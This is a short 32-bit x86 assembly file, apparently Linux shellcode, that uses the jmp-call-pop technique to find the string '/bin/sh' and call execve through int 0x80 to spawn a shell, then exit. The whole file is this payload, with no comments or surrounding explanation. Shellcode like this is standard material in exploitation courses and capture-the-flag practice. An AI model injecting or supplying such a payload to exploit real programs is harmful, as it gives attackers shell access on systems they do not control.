section .text
BITS 32

global _start

_start:

xor eax,eax
jmp Returns

back:
pop ebx
xor    ecx,ecx
mov    al,0xb
int    0x80

xor eax,eax
inc eax
int 0x80


Returns:
	call back
	db '/bin/sh'
	db 0x00

